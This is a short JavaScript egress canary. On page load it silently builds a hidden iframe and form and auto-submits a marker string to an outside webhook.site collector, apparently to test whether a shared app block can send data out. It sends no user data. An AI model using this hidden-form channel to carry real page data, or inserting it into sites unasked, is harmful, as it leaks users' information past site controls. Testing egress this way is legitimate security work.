(() => {
  "use strict";

  const MARKER = "PUBLIC_SHARE_FULLSCREEN_FORM_EGRESS_20261107";
  const COLLECTOR =
    "https://webhook.site/dc3d2613-f9e0-4105-80d5-0f3c9328557c";

  const status = document.createElement("pre");
  status.id = "form-egress-canary-status";
  status.style.cssText = [
    "box-sizing:border-box",
    "margin:12px",
    "padding:12px",
    "border:1px solid #f59e0b",
    "border-radius:8px",
    "white-space:pre-wrap",
    "font:13px/1.4 ui-monospace,monospace",
  ].join(";");
  status.textContent = `${MARKER} preparing`;
  document.body.appendChild(status);

  const target = document.createElement("iframe");
  target.name = `canary-${crypto.randomUUID()}`;
  target.hidden = true;
  target.setAttribute("aria-hidden", "true");
  document.body.appendChild(target);

  const form = document.createElement("form");
  form.method = "POST";
  form.action = COLLECTOR;
  form.target = target.name;
  form.hidden = true;

  const markerField = document.createElement("input");
  markerField.name = "marker";
  markerField.value = MARKER;
  form.appendChild(markerField);

  const sourceField = document.createElement("input");
  sourceField.name = "source";
  sourceField.value = "synthetic-app-block-canary";
  form.appendChild(sourceField);

  document.body.appendChild(form);
  form.submit();
  status.textContent = `${MARKER} submitted`;
})();
